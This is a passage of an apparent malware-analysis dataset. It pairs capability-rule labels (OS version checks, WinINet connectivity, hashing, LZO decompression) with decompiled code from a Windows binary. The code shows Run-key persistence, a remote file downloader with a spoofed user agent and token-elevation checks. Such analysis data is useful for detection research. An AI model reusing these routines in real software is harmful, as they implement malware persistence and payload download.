(var_114h == 3) {\n                    return var_8h + 0x276;\n                }\n            }\n            else if ((var_118h == 10) && (var_114h == 0)) {\n                return var_8h + 1000;\n            }\n        }\n        else if ((var_2h == '\\x02') || (var_2h == '\\x03')) {\n            if (var_118h == 5) {\n                if (var_114h == 1) {\n                    return var_8h + 0x13ec;\n                }\n                if (var_114h == 2) {\n                    return var_8h + 0x1450;\n                }\n            }\n            else if (var_118h == 6) {\n                if (var_114h == 0) {\n                    return var_8h + 6000;\n                }\n                if (var_114h == 1) {\n                    return var_8h + 0x17d4;\n                }\n                if (var_114h == 2) {\n                    return var_8h + 0x1838;\n                }\n                if (var_114h == 3) {\n                    return var_8h + 0x189c;\n                }\n            }\n            else if ((var_118h == 10) && (var_114h == 0)) {\n                return var_8h + 10000;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 736
    },
    "0008d724": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool fcn.0008d724(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t TokenInformation;\n    uint ReturnLength;\n    int32_t TokenHandle;\n    \n    TokenHandle = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &TokenHandle);\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar1);\n    iVar3 = 0;\n    if (iVar2 != 0) {\n        ReturnLength = 4;\n        iVar2 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x14, &TokenInformation, 4, &ReturnLength);\n        if (iVar2 != 0) {\n            iVar3 = TokenInformation;\n        }\n    }\n    if (TokenHandle != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n    }\n    return iVar3 != 0;\n}\n",
        "token_count": 220
    },
    "0008d965": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0008d965(uint arg_8h, uint nNumberOfBytesToRead, uint dwMoveMethod)\n\n{\n    uint arg_8h_00;\n    uint uVar1;\n    int32_t *in_ECX;\n    uint lpNumberOfBytesRead;\n    \n    if (*in_ECX != 0) {\n        fcn.0008dd97();\n    }\n    lpNumberOfBytesRead = 0;\n    arg_8h_00 = fcn.00085878();\n    (*_sym.imp.KERNEL32.dll_SetFilePointer)(in_ECX[2], 0, 0, dwMoveMethod);\n    uVar1 = (*_sym.imp.KERNEL32.dll_ReadFile)(in_ECX[2], arg_8h_00, nNumberOfBytesToRead, &lpNumberOfBytesRead, 0);\n    fcn.00082d5a(arg_8h_00, nNumberOfBytesToRead);\n    fcn.000858fb();\n    if (*in_ECX != 0) {\n        (*_sym.imp.KERNEL32.dll_ReleaseMutex)(in_ECX[3]);\n    }\n    return uVar1;\n}\n",
        "token_count": 249
    },
    "0008dc4d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0008dc4d(int32_t param_1)\n\n{\n    if (*(param_1 + 8) != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*(param_1 + 8));\n        *(param_1 + 8) = 0;\n    }\n    return;\n}\n",
        "token_count": 74
    },
    "0008dfc8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint16_t * __cdecl fcn.0008dfc8(uint16_t *arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    int32_t in_ECX;\n    uint16_t *puVar3;\n    int32_t in_EDX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t *piVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_EDX != 0) {\n        do {\n            uVar2 = *arg_8h;\n            iVar4 = in_EDX + -1;\n            uVar1 = uVar2 >> 0xc;\n            piVar7 = (uVar2 & 0xfff) + in_ECX;\n            puVar3 = arg_8h;\n            if (uVar1 == 3) {\n                *piVar7 = *piVar7 + arg_ch;\n            }\n            else if (uVar1 == 1) {\n                *piVar7 = *piVar7 * 0x10000 + arg_ch >> 0x10;\n            }\n            else if (uVar1 == 4) {\n                puVar3 = arg_8h + 1;\n                iVar4 = in_EDX + -2;\n                if ((uVar2 & 2) == 0) {\n                    uVar2 = *piVar7;\n                    iVar5 = arg_ch + 0x8000 + *puVar3 + uVar2 * 0x10000;\n                    *piVar7 = iVar5 >> 0x10;\n                    uVar6 = iVar5 + uVar2 * -0x10000 >> 0x10;\n                    uVar2 = 1;\n                    if (uVar6 - (arg_ch >> 0x10) != 1) {\n                        if (uVar6 == arg_ch >> 0x10) goto code_r0x0008e129;\n                        uVar2 = 2;\n                    }\n                    *arg_8h = *arg_8h | uVar2;\n                }\n            }\n            else if (uVar1 == 2) {\n                *piVar7 = *piVar7 + arg_ch;\n            }\n            else if (((uVar1 != 0) && (uVar1 != 6)) && (uVar1 != 7)) {\n                if (uVar1 != 0xb) {\n                    return NULL;\n                }\n                puVar3 = arg_8h + 2;\n                uVar6 = *puVar3 * 0x10000;\n                uVar8 = uVar6 + arg_8h[1];\n                uVar9 = uVar8 + arg_ch;\n                *piVar7 = (uVar9 + 0x8000 >> 0x10 |\n                          (((*piVar7 << 0x10) * 0x10000 >> 0x20) + (*puVar3 >> 0x10) + CARRY4(uVar6, arg_8h[1]) +\n                           arg_10h + CARRY4(uVar8, arg_ch) + (0xffff7fff < uVar9)) * 0x10000) + 0x8000 >> 0x10;\n                iVar4 = in_EDX + -3;\n            }\ncode_r0x0008e129:\n            arg_8h = puVar3 + 1;\n            in_EDX = iVar4;\n        } while (iVar4 != 0);\n    }\n    return arg_8h;\n}\n",
        "token_count": 838
    },
    "0008ea37": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0008ea37(uint *lpValueName)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    if ((*in_ECX != 0) && (iVar1 = (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(*in_ECX, *lpValueName),  iVar1 == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 94
    },
    "0008ea59": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0008ea59(uint noname_0, uint *lpSubKey)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(0x80000001, *lpSubKey, 0, 0, 1, 1, 0);\n    return iVar1 == 0;\n}\n",
        "token_count": 93
    },
    "0008ea99": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0008ea99(int32_t *param_1)\n\n{\n    if (*param_1 != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(*param_1);\n    }\n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 64
    },
    "0008edaa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0008edaa(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint uVar3;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uchar *arg_8h_00;\n    uint *arg_8h_01;\n    uint arg_8h_02;\n    uint uVar4;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    \n    iVar1 = arg_8h;\n    fcn.0008230d(arg_8h);\n    iVar2 = fcn.0008d724();\n    if (iVar2 == 1) {\n        uVar4 = 0x23;\n        uVar3 = 0x80000002;\n    }\n    else {\n        uVar4 = 0x1a;\n        uVar3 = 0x80000001;\n    }\n    *(in_ECX + 8) = uVar3;\n    *(in_ECX + 0xc) = uVar4;\n    uVar3 = fcn.000833ab(L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\\");\n    fcn.000831fd(uVar3);\n    fcn.000858fb();\n    fcn.000833f3(iVar1 + 0x30);\n    fcn.000830fb(&arg_8h);\n    fcn.000858fb();\n    uVar3 = fcn.000833ab(L\"inst\");\n    fcn.000831fd(uVar3);\n    fcn.000858fb();\n    uVar3 = fcn.000833ab(L\"InitWindows\");\n    fcn.000831fd(uVar3);\n    fcn.000858fb();\n    uVar3 = fcn.000833ab(L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\\");\n    fcn.000831fd(uVar3);\n    fcn.000858fb();\n    iVar2 = fcn.0008eb4b(0x80000001, in_ECX + 0x10, 0xf003f, 0);\n    *(in_ECX + 0x24) = iVar2;\n    if (iVar2 != 0) {\n        var_ch = 0;\n        var_8h = 0;\n        if (*(iVar1 + 0x18) != 0) {\n            iVar2 = fcn.0008eaae(in_ECX + 0x18, &var_ch);\n            if (iVar2 == 0) {\n                *(in_ECX + 0x28) = 0;\n            }\n            else {\n                arg_8h_01 = &var_ch;\n                arg_8h_02 = extraout_ECX;\n                fcn.00082e12(arg_8h_01);\n                arg_8h_00 = &stack0xffffff7c;\n                uVar3 = extraout_ECX_00;\n                uVar4 = extraout_ECX_00;\n                fcn.000853aa(&stack0xffffff7c);\n                fcn.00085b00(arg_8h_00, uVar3, uVar4, arg_8h_01);\n                uVar3 = fcn.00082ca1(arg_8h_02);\n                fcn.000831fd(uVar3);\n                fcn.000858fb();\n                arg_8h = 0;\n                fcn.00082dff();\n                *(in_ECX + 0x28) = 1;\n            }\n        }\n        if (*(iVar1 + 0x20) != 0) {\n            uVar3 = fcn.0008d1e6();\n            fcn.000831fd(uVar3);\n            fcn.000858fb();\n        }\n        fcn.00082dff();\n    }\n    return;\n}\n",
        "token_count": 851
    },
    "0008ef5f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0008ef5f(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_ch_00;\n    int32_t *in_ECX;\n    uint *arg_8h_00;\n    uint var_8h;\n    \n    if (*in_ECX != 0) {\n        arg_8h_00 = &var_8h;\n        arg_ch_00 = fcn.00082fe7(arg_8h_00);\n        fcn.0008eb18(arg_8h, arg_ch_00, arg_8h_00);\n        fcn.00082dff();\n    }\n    return;\n}\n",
        "token_count": 141
    },
    "0008f445": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0008f445(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint arg_ch;\n    int32_t iVar5;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar5 = 0;\n    iVar2 = (*_sym.imp.WININET.dll_InternetOpenW)(L\"Mozilla/32.0 (compatible)\", 0, 0, 0, 0);\n    if ((iVar2 != 0) &&\n       (iVar3 = (*_sym.imp.WININET.dll_InternetOpenUrlW)(iVar2, param_1, 0, 0, 0x400000, 0),  iVar3 != 0)) {\n        var_4h = 0;\n        (*str._u._0_4_)(iVar3, &var_4h, 0, 0);\n        var_8h = -1;\n        iVar4 = fcn.0008590a();\n        if (iVar4 != 0) {\n            var_ch = 0;\n            do {\n                arg_ch = fcn.000810ad(var_4h);\n                (*_sym.imp.WININET.dll_InternetReadFile)(iVar3, arg_ch, var_4h, &var_8h);\n                var_ch = var_ch + var_4h;\n                (*str._u._0_4_)(iVar3, &var_4h, 0, 0);\n                fcn.0008102c(iVar4 + iVar5, arg_ch, var_8h);\n                iVar5 = iVar5 + var_8h;\n                fcn.000810c1(arg_ch);\n                pcVar1 = _sym.imp.WININET.dll_InternetCloseHandle;\n            } while (var_8h != 0);\n            (*_sym.imp.WININET.dll_InternetCloseHandle)(iVar2);\n            (*pcVar1)(iVar3);\n            if (iVar5 == var_ch) {\n                *param_2 = iVar5;\n                return iVar4;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 516
    },
    "0008fa7c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0008fa7c(void)\n\n{\n    fcn.0008dd97();\n    if ((*0x96d6c != 0) && (*0x96d68 != 0)) {\n        fcn.000903a6(*0x96d68);\n        *0x96d6c = 0;\n    }\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(*0x96d70);\n    return;\n}\n",
        "token_count": 98
    },
    "0008fab3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0008fab3(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    \n    fcn.0008dd97();\n    if (*0x96d6c == 0) {\n        if (*0x96d68 == 0) {\n            iVar1 = fcn.000859a9();\n            if (iVar1 == 0) {\n                *0x96d68 = 0;\n            }\n            else {\n                *0x96d68 = fcn.000905e9(extraout_ECX);\n            }\n        }\n        *0x96d64 = arg_8h;\n        *0x96d6c = 1;\n        fcn.0009041f(arg_ch);\n    }\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(*0x96d70);\n    return;\n}\n",
        "token_count": 195
    },
    "00090180": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00090180(uint32_t param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *ppv;\n    int32_t *var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    uVar1 = fcn.0008fb5c();\n    if (uVar1 < param_1) {\n        param_1 = 0;\n    }\n    uVar1 = 0;\n    *param_2 = 0;\n    (*_sym.imp.ole32.dll_CoCreateInstance)(0x923c0, 0, 1, 0x94674, &ppv);\n    if ((ppv != NULL) && ((**(*ppv + 0xc))(ppv, 0x923b0, &var_4h, 0),  var_4h != NULL)) {\n        (**(*var_4h + 0x14))(var_4h);\n        while( true ) {\n            var_8h = 0;\n            iVar2 = (**(*var_4h + 0xc))(var_4h, 1, &var_ch, &var_8h);\n            if (iVar2 != 0) break;\n            (**(*var_ch + 0x20))(var_ch, 0, 0, 0x92360, param_2);\n            if (*param_2 != 0) {\n                if (uVar1 == param_1) break;\n                uVar1 = uVar1 + 1;\n                fcn.00082411();\n            }\n        }\n        if (var_4h != NULL) {\n            (**(*var_4h + 8))(var_4h);\n            var_4h = NULL;\n        }\n        if (ppv != NULL) {\n            (**(*ppv + 8))(ppv);\n        }\n    }\n    return;\n}\n",
        "token_count": 424
    },
    "0009041f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0009041f(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *in_ECX;\n    uint *puVar3;\n    uint *puVar4;\n    uint in_stack_fffffe8c;\n    uint var_c4h;\n    int32_t var_80h;\n    uint var_7ch;\n    uint var_6ch;\n    uint var_60h;\n    uchar auStack52 [4];\n    uint var_2ch;\n    uint var_28h;\n    uint var_22h;\n    \n    (*_sym.imp.ole32.dll_CoInitialize)();\n    (*_sym.imp.ole32.dll_CoCreateInstance)();\n    if (in_ECX[6] != NULL) {\n        (***in_ECX[6])();\n        if (in_ECX[7] != NULL) {\n            (**(*in_ECX[7] + 4))();\n            if (in_ECX + 8 != NULL) {\n                fcn.00090180();\n            }\n            if (in_ECX[8] != 0) {\n                (*_sym.imp.ole32.dll_CoCreateInstance)();\n                piVar1 = in_ECX[9];\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0xc))();\n                    (**(*in_ECX[9] + 0xc))();\n                    fcn.00081052();\n                    (**(*in_ECX[6] + 0x10))();\n                    iVar2 = fcn.0008fd9d();\n                    in_ECX[10] = iVar2;\n                    if (iVar2 != 0) {\n                        iVar2 = fcn.0008fdb9();\n                        in_ECX[0xb] = iVar2;\n                        if (iVar2 != 0) {\n                            iVar2 = (**(*in_ECX[9] + 0x2c))();\n                            if (-1 < iVar2) {\n                                (**(*in_ECX[6] + 0x14))();\n                                fcn.0008102c(auStack52 + ((var_80h + 0x30) - var_80h) + -0x30, var_80h + 0x30, 0x28);\n                                fcn.0008fc00();\n                                fcn.0009023f(arg_8h, var_28h, var_2ch, var_22h);\n                                fcn.000856f9();\n                                puVar3 = *(in_ECX[1] + arg_8h * 4);\n                                puVar4 = &stack0xfffffe8c;\n                                for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n                                    *puVar4 = *puVar3;\n                                    puVar3 = puVar3 + 1;\n                                    puVar4 = puVar4 + 1;\n                                }\n                                fcn.0008fced(in_stack_fffffe8c);\n                                iVar2 = fcn.0008fd9d();\n                                in_ECX[0xc] = iVar2;\n                                if (iVar2 != 0) {\n                                    (**(*in_ECX[6] + 0x24))(in_ECX[6], *in_ECX, 0);\n                                    (***in_ECX[9])(in_ECX[9], 0x923a0, in_ECX + 0xd);\n                                    piVar1 = in_ECX[0xd];\n                                    if (piVar1 != NULL) {\n                                        (**(*piVar1 + 0x1c))(piVar1);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 811
    },
    "000911f2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.000911f2(int32_t *arg_8h)\n\n{\n    int32_t unaff_ESI;\n    uchar *arg_8h_00;\n    uchar auStack16 [12];\n    \n    fcn.00090ce2(auStack16, arg_8h[2], 4);\n    if (unaff_ESI != 0) {\n        arg_8h_00 = &stack0xffffffe4;\n        fcn.00082e12(arg_8h_00);\n        fcn.000911d7(arg_8h_00);\n        fcn.00091179(**arg_8h, (*arg_8h)[1]);\n    }\n    fcn.00082dff();\n    return unaff_ESI != 0;\n}\n",
        "token_count": 171
    },
    "00081052": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nuint * fcn.00081052(uint *param_1, uchar param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    \n    if (param_3 != 0) {\n        puVar2 = param_1;\n        for (uVar1 = param_3 >> 2; uVar1 != 0; uVar1 = uVar1 - 1) {\n            *puVar2 = CONCAT22(CONCAT11(param_2, param_2), CONCAT11(param_2, param_2));\n            puVar2 = puVar2 + 1;\n        }\n        for (param_3 = param_3 & 3; param_3 != 0; param_3 = param_3 - 1) {\n            *puVar2 = param_2;\n            puVar2 = puVar2 + 1;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 206
    },
    "000857f3": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.000857f3(code **param_1, code **param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = 0;\n    uVar2 = param_2 + (3 - param_1) >> 2;\n    if (param_2 < param_1) {\n        uVar2 = 0;\n    }\n    if (uVar2 != 0) {\n        do {\n            if (*param_1 != NULL) {\n                (**param_1)();\n            }\n            param_1 = param_1 + 1;\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < uVar2);\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "00085b75": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00085b75(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint var_ch;\n    uint var_1h;\n    \n    uVar1 = 0;\n    do {\n        *(&var_ch + uVar1) = *((-(uVar1 < 4) & 4) + 0x14 + param_2) >> (('\\x03' - (uVar1 & 3)) * '\\b' & 0x1f);\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 8);\n    var_1h._0_1_ = 0x80;\n    while( true ) {\n        fcn.00085c1b(1);\n        if ((*(param_2 + 0x14) & 0x1f8) == 0x1c0) break;\n        var_1h._0_1_ = 0;\n    }\n    fcn.00085c1b(8);\n    uVar1 = 0;\n    do {\n        *(uVar1 + param_1) = *(param_2 + (uVar1 & 0xfffffffc)) >> (('\\x03' - (uVar1 & 3)) * '\\b' & 0x1f);\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 0x14);\n    fcn.00081052(param_2, 0, 0x5c);\n    fcn.00081052(&var_ch, 0, 8);\n    return;\n}\n",
        "token_count": 389
    },
    "0008f2c7": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0008f2c7(uint noname_0, uint32_t *arg_ch)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t in_EDX;\n    uint32_t uVar4;\n    int32_t iVar5;\n    \n    uVar4 = 0x10ad;\n    iVar5 = (in_EDX >> 0x1f & 3U) + in_EDX >> 2;\n    puVar1 = in_ECX + iVar5 * 4;\n    for (iVar5 = -iVar5; iVar5 != 0; iVar5 = iVar5 + 1) {\n        uVar4 = (*(puVar1 + iVar5 * 4) * 0x16a88000 | *(puVar1 + iVar5 * 4) * -0x3361d2af >> 0x11) * 0x1b873593 ^ uVar4;\n        uVar4 = (uVar4 << 0xd | uVar4 >> 0x13) * 5 + 0xe6546b64;\n    }\n    uVar3 = 0;\n    uVar2 = in_EDX & 3;\n    if (uVar2 != 1) {\n        if (uVar2 != 2) {\n            if (uVar2 != 3) goto code_r0x0008f346;\n            uVar3 = puVar1[2] << 0x10;\n        }\n        uVar3 = uVar3 ^ puVar1[1] << 8;\n    }\n    uVar4 = uVar4 ^ ((*puVar1 ^ uVar3) * 0x16a88000 | (*puVar1 ^ uVar3) * -0x3361d2af >> 0x11) * 0x1b873593;\ncode_r0x0008f346:\n    uVar4 = ((uVar4 ^ in_EDX) >> 0x10 ^ uVar4 ^ in_EDX) * -0x7a143595;\n    uVar4 = (uVar4 >> 0xd ^ uVar4) * -0x3d4d51cb;\n    *arg_ch = uVar4 >> 0x10 ^ uVar4;\n    return;\n}\n",
        "token_count": 523
    },
    "0008108f": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t fcn.0008108f(void)\n\n{\n    *0x965a0 = *0x965a0 * 0x343fd + 0x269ec3;\n    return *0x965a0 >> 0x10 & 0x7fff;\n}\n",
        "token_count": 63
    },
    "00081560": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00081560(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t **in_ECX;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    if (in_ECX[2] < in_ECX[1]) {\n        var_8h = *in_ECX;\n    }\n    else {\n        piVar3 = (in_ECX[2] + 1U) * in_ECX[3];\n        piVar1 = fcn.000859a9();\n        if (piVar1 == NULL) {\n            var_8h = NULL;\n        }\n        else {\n            var_8h = piVar1 + 1;\n            *piVar1 = piVar3;\n            for (piVar2 = piVar3; piVar2 != NULL; piVar2 = piVar2 + -1) {\n                piVar1[2] = 0;\n                piVar1[3] = 0;\n                piVar1 = piVar1 + 3;\n            }\n        }\n        if (in_ECX[2] != NULL) {\n            piVar1 = var_8h + 2;\n            piVar2 = NULL;\n            do {\n                piVar4 = (-8 - var_8h) + piVar1 + *in_ECX;\n                piVar1[-2] = *piVar4;\n                fcn.000831fd(piVar4 + 1);\n                fcn.000831fd(piVar4 + 2);\n                piVar2 = piVar2 + 1;\n                piVar1 = piVar1 + 3;\n            } while (piVar2 < in_ECX[2]);\n        }\n        if (*in_ECX != NULL) {\n            for (iVar5 = (*in_ECX)[-1]; iVar5 != 0; iVar5 = iVar5 + -1) {\n                fcn.000813b6();\n            }\n        }\n        *in_ECX = var_8h;\n        in_ECX[1] = piVar3;\n    }\n    var_8h[in_ECX[2] * 3] = arg_8h;\n    fcn.000831fd(&arg_ch);\n    fcn.000831fd(&arg_10h);\n    in_ECX[2] = in_ECX[2] + 1;\n    fcn.000813b6();\n    return;\n}\n",
        "token_count": 587
    },
    "0008f84f": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0008f84f(uint arg_8h, uint noname_1, uint noname_2, uint arg_14h, uint noname_4, uint noname_5, uint noname_6, \n            int32_t arg_24h, int32_t arg_28h)\n\n{\n    ushort uStack64;\n    int32_t iStack62;\n    uint uStack58;\n    uint uStack54;\n    uint uStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    ushort uStack36;\n    ushort uStack34;\n    uint uStack32;\n    int32_t iStack28;\n    \n    uStack48 = 0x28;\n    uStack36 = 1;\n    uStack34 = 0x18;\n    uStack32 = 0;\n    iStack28 = arg_28h * arg_24h * 3;\n    iStack44 = arg_24h;\n    iStack40 = arg_28h;\n    uStack54 = 0x36;\n    uStack64 = 0x4d42;\n    arg_28h = ((arg_24h + 1) * 3 & 0xfffffffcU) * arg_28h;\n    iStack62 = arg_28h + 0x36;\n    uStack58 = 0;\n    fcn.00082d5a(&uStack64, 0xe);\n    fcn.00082d5a(&uStack58 + 2, 0x28);\n    fcn.00082d5a(arg_8h, arg_28h);\n    fcn.00084a3d(&stack0xffffffa8);\n    fcn.00082dff();\n    fcn.00090678();\n    return;\n}\n",
        "token_count": 393
    },
    "null": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "000853f7": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
